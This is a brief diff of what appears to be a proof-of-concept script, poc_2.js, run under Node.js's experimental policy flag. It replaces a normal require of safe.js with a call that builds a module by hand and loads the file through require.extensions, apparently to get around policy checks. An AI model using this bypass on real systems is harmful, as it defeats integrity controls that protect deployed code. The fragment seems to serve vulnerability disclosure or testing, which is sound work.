@@ -6,6 +6,6 @@ node --experimental-policy=policy.json poc_2.js
 
 */
 
-//m = new require.main.constructor();
-//require.extensions[".js"](m, "./safe.js")
-require("./safe.js")
+m = new require.main.constructor();
+require.extensions[".js"](m, "./safe.js")
+//require("./safe.js")
